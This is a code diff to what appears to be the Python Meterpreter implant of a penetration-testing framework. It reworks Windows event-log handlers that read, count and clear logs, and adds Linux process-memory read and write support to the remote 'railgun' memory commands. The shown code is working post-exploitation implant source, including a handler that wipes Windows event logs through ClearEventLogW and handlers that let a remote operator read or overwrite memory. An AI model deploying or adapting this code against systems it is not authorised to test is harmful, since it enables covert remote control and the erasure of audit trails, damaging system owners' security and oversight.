@@ -73,6 +73,24 @@ if has_ctypes:
 	# Windows Structures
 	#
 	size_t = getattr(ctypes, 'c_uint' + str(ctypes.sizeof(ctypes.c_void_p) * 8))
+	class EVENTLOGRECORD(ctypes.Structure):
+		_fields_ = [("Length", ctypes.c_uint32),
+			("Reserved", ctypes.c_uint32),
+			("RecordNumber", ctypes.c_uint32),
+			("TimeGenerated", ctypes.c_uint32),
+			("TimeWritten", ctypes.c_uint32),
+			("EventID", ctypes.c_uint32),
+			("EventType", ctypes.c_uint16),
+			("NumStrings", ctypes.c_uint16),
+			("EventCategory", ctypes.c_uint16),
+			("ReservedFlags", ctypes.c_uint16),
+			("ClosingRecordNumber", ctypes.c_uint32),
+			("StringOffset", ctypes.c_uint32),
+			("UserSidLength", ctypes.c_uint32),
+			("UserSidOffset", ctypes.c_uint32),
+			("DataLength", ctypes.c_uint32),
+			("DataOffset", ctypes.c_uint32)]
+
 	class SOCKADDR(ctypes.Structure):
 		_fields_ = [("sa_family", ctypes.c_ushort),
 			("sa_data", (ctypes.c_uint8 * 14))]
@@ -241,24 +259,6 @@ if has_ctypes:
 	class UNIVERSAL_NAME_INFO(ctypes.Structure):
 		_fields_ = [("lpUniversalName", ctypes.c_wchar_p)]
 
-	class EVENTLOGRECORD(ctypes.Structure):
-		_fields_ = [("Length", ctypes.c_uint32),
-			("Reserved", ctypes.c_uint32),
-			("RecordNumber", ctypes.c_uint32),
-			("TimeGenerated", ctypes.c_uint32),
-			("TimeWritten", ctypes.c_uint32),
-			("EventID", ctypes.c_uint32),
-			("EventType", ctypes.c_uint16),
-			("NumStrings", ctypes.c_uint16),
-			("EventCategory", ctypes.c_uint16),
-			("ReservedFlags", ctypes.c_uint16),
-			("ClosingRecordNumber", ctypes.c_uint32),
-			("StringOffset", ctypes.c_uint32),
-			("UserSidLength", ctypes.c_uint32),
-			("UserSidOffset", ctypes.c_uint32),
-			("DataLength", ctypes.c_uint32),
-			("DataOffset", ctypes.c_uint32)]
-
 	class WINHTTP_CURRENT_USER_IE_PROXY_CONFIG(ctypes.Structure):
 		_fields_ = [("fAutoDetect", ctypes.c_bool),
 			("lpszAutoConfigUrl", ctypes.c_wchar_p),
@@ -282,6 +282,10 @@ if has_ctypes:
 			("index", ctypes.c_int32),
 			("flags", ctypes.c_uint32),
 			("chagen", ctypes.c_uint32)]
+
+	class IOVEC(ctypes.Structure):
+		_fields_ = [("iov_base", ctypes.c_void_p),
+			("iov_len", size_t)]
 
 	class NLMSGHDR(ctypes.Structure):
 		_fields_ = [("len", ctypes.c_uint32),
@@ -1127,70 +1131,70 @@ def stdapi_sys_process_get_processes(request, response):
 
 @meterpreter.register_function_windll
 def stdapi_sys_eventlog_open(request, response):
-    source_name = packet_get_tlv(request, TLV_TYPE_EVENT_SOURCENAME)['value']
-    handle = ctypes.windll.advapi32.OpenEventLogW(None, source_name)
-    if not handle:
-        return error_result_windows(), response
-    response += tlv_pack(TLV_TYPE_EVENT_HANDLE, handle)
-    return ERROR_SUCCESS, response
+	source_name = packet_get_tlv(request, TLV_TYPE_EVENT_SOURCENAME)['value']
+	handle = ctypes.windll.advapi32.OpenEventLogW(None, source_name)
+	if not handle:
+		return error_result_windows(), response
+	response += tlv_pack(TLV_TYPE_EVENT_HANDLE, handle)
+	return ERROR_SUCCESS, response
 
 @meterpreter.register_function_windll
 def stdapi_sys_eventlog_read(request, response):
-    handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
-    flags = packet_get_tlv(request, TLV_TYPE_EVENT_READFLAGS)['value']
-    offset = packet_get_tlv(request, TLV_TYPE_EVENT_RECORDOFFSET)['value']
-    adv32 = ctypes.windll.advapi32
-    bytes_read = ctypes.c_ulong(0)
-    bytes_needed = ctypes.c_ulong(0)
-    if adv32.ReadEventLogW(handle, flags, offset, ctypes.byref(bytes_read), 0, ctypes.byref(bytes_read), ctypes.byref(bytes_needed)):
-        return error_result_windows(), response
-    buf = ctypes.create_unicode_buffer(bytes_needed.value)
-    if not adv32.ReadEventLogW(handle, flags, offset, buf, bytes_needed, ctypes.byref(bytes_read), ctypes.byref(bytes_needed)):
-        return error_result_windows(), response
-    record = cstruct_unpack(EVENTLOGRECORD, buf)
-    response += tlv_pack(TLV_TYPE_EVENT_RECORDNUMBER, record.RecordNumber)
-    response += tlv_pack(TLV_TYPE_EVENT_TIMEGENERATED, record.TimeGenerated)
-    response += tlv_pack(TLV_TYPE_EVENT_TIMEWRITTEN, record.TimeWritten)
-    response += tlv_pack(TLV_TYPE_EVENT_ID, record.EventID)
-    response += tlv_pack(TLV_TYPE_EVENT_TYPE, record.EventType)
-    response += tlv_pack(TLV_TYPE_EVENT_CATEGORY, record.EventCategory)
-    response += tlv_pack(TLV_TYPE_EVENT_DATA, buf.raw[record.DataOffset:record.DataOffset+record.DataLength])
-    event_strings = buf.raw[record.StringOffset:].split('\x00', record.NumStrings)
-    for event_string in event_strings:
-        response += tlv_pack(TLV_TYPE_EVENT_STRING, event_string)
-    return ERROR_SUCCESS, response
+	handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
+	flags = packet_get_tlv(request, TLV_TYPE_EVENT_READFLAGS)['value']
+	offset = packet_get_tlv(request, TLV_TYPE_EVENT_RECORDOFFSET)['value']
+	adv32 = ctypes.windll.advapi32
+	bytes_read = ctypes.c_ulong(0)
+	bytes_needed = ctypes.c_ulong(0)
+	if adv32.ReadEventLogW(handle, flags, offset, ctypes.byref(bytes_read), 0, ctypes.byref(bytes_read), ctypes.byref(bytes_needed)):
+		return error_result_windows(), response
+	buf = ctypes.create_unicode_buffer(bytes_needed.value)
+	if not adv32.ReadEventLogW(handle, flags, offset, buf, bytes_needed, ctypes.byref(bytes_read), ctypes.byref(bytes_needed)):
+		return error_result_windows(), response
+	record = cstruct_unpack(EVENTLOGRECORD, buf)
+	response += tlv_pack(TLV_TYPE_EVENT_RECORDNUMBER, record.RecordNumber)
+	response += tlv_pack(TLV_TYPE_EVENT_TIMEGENERATED, record.TimeGenerated)
+	response += tlv_pack(TLV_TYPE_EVENT_TIMEWRITTEN, record.TimeWritten)
+	response += tlv_pack(TLV_TYPE_EVENT_ID, record.EventID)
+	response += tlv_pack(TLV_TYPE_EVENT_TYPE, record.EventType)
+	response += tlv_pack(TLV_TYPE_EVENT_CATEGORY, record.EventCategory)
+	response += tlv_pack(TLV_TYPE_EVENT_DATA, buf.raw[record.DataOffset:record.DataOffset + record.DataLength])
+	event_strings = buf.raw[record.StringOffset:].split('\x00', record.NumStrings)
+	for event_string in event_strings:
+		response += tlv_pack(TLV_TYPE_EVENT_STRING, event_string)
+	return ERROR_SUCCESS, response
 
 @meterpreter.register_function_windll
 def stdapi_sys_eventlog_clear(request, response):
-    handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
-    if not ctypes.windll.advapi32.ClearEventLogW(handle, None):
-        return error_result_windows(), response
-    return ERROR_SUCCESS, response
+	handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
+	if not ctypes.windll.advapi32.ClearEventLogW(handle, None):
+		return error_result_windows(), response
+	return ERROR_SUCCESS, response
 
 @meterpreter.register_function_windll
 def stdapi_sys_eventlog_numrecords(request, response):
-    handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
-    total = ctypes.c_ulong(0)
-    if not ctypes.windll.advapi32.GetNumberOfEventLogRecords(handle, ctypes.byref(total)):
-        return error_result_windows(), response
-    response += tlv_pack(TLV_TYPE_EVENT_NUMRECORDS, total.value)
-    return ERROR_SUCCESS, response
+	handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
+	total = ctypes.c_ulong(0)
+	if not ctypes.windll.advapi32.GetNumberOfEventLogRecords(handle, ctypes.byref(total)):
+		return error_result_windows(), response
+	response += tlv_pack(TLV_TYPE_EVENT_NUMRECORDS, total.value)
+	return ERROR_SUCCESS, response
 
 @meterpreter.register_function_windll
 def stdapi_sys_eventlog_oldest(request, response):
-    handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
-    oldest = ctypes.c_ulong(0)
-    if not ctypes.windll.advapi32.GetOldestEventLogRecordW(handle, ctypes.byref(oldest)):
-        return error_result_windows(), response
-    response += tlv_pack(TLV_TYPE_EVENT_RECORDNUMBER, oldest)
-    return ERROR_SUCCESS, response
+	handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
+	oldest = ctypes.c_ulong(0)
+	if not ctypes.windll.advapi32.GetOldestEventLogRecordW(handle, ctypes.byref(oldest)):
+		return error_result_windows(), response
+	response += tlv_pack(TLV_TYPE_EVENT_RECORDNUMBER, oldest)
+	return ERROR_SUCCESS, response
 
 @meterpreter.register_function_windll
 def stdapi_sys_eventlog_close(request, response):
-    handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
-    if not ctypes.windll.advapi32.CloseEventLogW(handle):
-        return error_result_windows(), response
-    return ERROR_SUCCESS, response
+	handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
+	if not ctypes.windll.advapi32.CloseEventLogW(handle):
+		return error_result_windows(), response
+	return ERROR_SUCCESS, response
 
 @meterpreter.register_function
 def stdapi_fs_chdir(request, response):
@@ -1666,6 +1670,97 @@ def stdapi_net_socket_tcp_shutdown(request, response):
 	channel.shutdown(how)
 	return ERROR_SUCCESS, response
 
+def _linux_get_maps():
+	maps = []
+	lines = open("/proc/{0}/maps".format(os.getpid()), 'r')
+	for line in lines:
+		region = dict(zip(
+			('address', 'perms', 'offset', 'dev', 'inode', 'pathname'),
+			line.split(' ', 5)
+		))
+		region['address-start'], region['address-end'] = region.pop('address').split('-')
+		region['address-start'] = int(region['address-start'], 16)
+		region['address-end'] = int(region['address-end'], 16)
+		region['inode'] = int(region['inode'])
+		region['offset'] = int(region['offset'], 16)
+		region['pathname'] = region['pathname'].strip()
+		region['size'] = region['address-end'] - region['address-start']
+		maps.append(region)
+	return maps
+
+def _linux_check_maps(address, size, perms=''):
+	perms = perms.lower()
+	maps = _linux_get_maps()
+	def _get_region(address):
+		for region in maps:
+			if region['address-start'] <= cursor < region['address-end']:
+				return region
+		return None
+
+	cursor = address
+	address += size
+	while cursor < address:
+		region = _get_region(cursor)
+		if region is None:
+			return False
+		for perm in perms:
+			if perm == '-':
+				continue
+			if not perm in region['perms']:
+				return False
+		if cursor + size < region['address-end']:
+			break
+		size -= region['address-end'] - cursor
+		cursor = region['address-end']
+	return True
+
+def _linux_memread(address, size):
+	libc = ctypes.cdll.LoadLibrary('libc.so.6')
+	if not hasattr(libc, 'process_vm_readv'):
+		# requires linux 3.2+ / glibc 2.15+, see:
+		# http://man7.org/linux/man-pages/man2/process_vm_readv.2.html#VERSIONS
+		raise RuntimeError('process_vm_readv is unavailable')
+	if not _linux_check_maps(address, size, perms='r'):
+		raise RuntimeError('invalid permissions')
+	buff = (ctypes.c_byte * size)()
+	local_iov = IOVEC(iov_base=ctypes.cast(buff, ctypes.c_void_p), iov_len=size)
+	remote_iov = IOVEC(iov_base=address, iov_len=size)
+	result = libc.process_vm_readv(
+		os.getpid(),
+		ctypes.byref(local_iov),
+		1,
+		ctypes.byref(remote_iov),
+		1,
+		0
+	)
+	if result == -1:
+		raise RuntimeError('operation failed')
+	return ctarray_to_bytes(buff)
+
+def _linux_memwrite(address, data):
+	libc = ctypes.cdll.LoadLibrary('libc.so.6')
+	if not hasattr(libc, 'process_vm_writev'):
+		# requires linux 3.2+ / glibc 2.15+, see:
+		# http://man7.org/linux/man-pages/man2/process_vm_writev.2.html#VERSIONS
+		raise RuntimeError('process_vm_writev is unavailable')
+	size = len(data)
+	if not _linux_check_maps(address, size, perms='w'):
+		raise RuntimeError('invalid permissions')
+	buff = bytes_to_ctarray(data)
+	local_iov = IOVEC(iov_base=ctypes.cast(buff, ctypes.c_void_p), iov_len=size)
+	remote_iov = IOVEC(iov_base=address, iov_len=size)
+	result = libc.process_vm_writev(
+		os.getpid(),
+		ctypes.byref(local_iov),
+		1,
+		ctypes.byref(remote_iov),
+		1,
+		0
+	)
+	if result == -1:
+		raise RuntimeError('operation failed')
+	return size
+
 def _win_format_message(source, msg_id):
 	EN_US = 0
 	msg_flags = 0
@@ -1788,24 +1883,34 @@ def stdapi_railgun_api_multi(request, response):
 		response += tlv_pack(TLV_TYPE_RAILGUN_MULTI_GROUP, group_result)
 	return ERROR_SUCCESS, response
 
-@meterpreter.register_function_windll
+@meterpreter.register_function
 def stdapi_railgun_memread(request, response):
 	address = packet_get_tlv(request, TLV_TYPE_RAILGUN_MEM_ADDRESS)['value']
 	length = packet_get_tlv(request, TLV_TYPE_RAILGUN_MEM_LENGTH)['value']
-	result = _win_memread(address, length)
-	if result is None:
-		return error_result_windows(), response
+	if sys.platform.startswith('linux'):
+		result = _linux_memread(address, length)
+	elif has_windll:
+		result = _win_memread(address, length)
+		if result is None:
+			return error_result_windows(), response
+	else:
+		return ERROR_FAILURE, response
 	response += tlv_pack(TLV_TYPE_RAILGUN_MEM_DATA, result)
 	return ERROR_SUCCESS, response
 
-@meterpreter.register_function_windll
+@meterpreter.register_function
 def stdapi_railgun_memwrite(request, response):
 	address = packet_get_tlv(request, TLV_TYPE_RAILGUN_MEM_ADDRESS)['value']
 	data = packet_get_tlv(request, TLV_TYPE_RAILGUN_MEM_DATA)['value']
 	length = packet_get_tlv(request, TLV_TYPE_RAILGUN_MEM_LENGTH)['value']
-	result = _win_memwrite(address, data)
-	if result is None:
-		return error_result_windows(), response
+	if sys.platform.startswith('linux'):
+		result = _linux_memwrite(address, data)
+	elif has_windll:
+		result = _win_memwrite(address, data)
+		if result is None:
+			return error_result_windows(), response
+	else:
+		return ERROR_FAILURE, response
 	return ERROR_SUCCESS, response
 
 def _wreg_close_key(hkey):
